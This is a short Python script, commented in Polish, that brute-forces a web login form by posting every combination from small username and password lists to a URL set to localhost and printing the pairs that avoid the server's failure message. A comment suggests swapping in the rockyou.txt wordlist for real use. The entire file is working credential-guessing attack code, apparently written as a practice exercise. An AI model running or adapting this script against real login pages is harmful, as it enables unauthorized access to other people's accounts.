import requests

#adres ktory atakujemy, zakladamy ze trzeba sie tam zalogowac
attack_url = "http://localhost/"

#dane testowe, jakbysmy pisali na powaznie to bysmy dali jakies rockyoy.txt czy cos
usernames = ["admin", "user",]
passwords = ["123", "password", "admin123", "haslo"]

# Co serwer zwraca przy nieudanym logowaniu (fragment tekstu)
fail = "Invalid username or password"



#iterujemy po kombinacjac
for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(attack_url, data=data, )

        if fail not in response.text:
            print(f"Login: {username} Password: {password}")
        else:
            print(f"NIE PRZESZLO Login: {username} Password: {password}")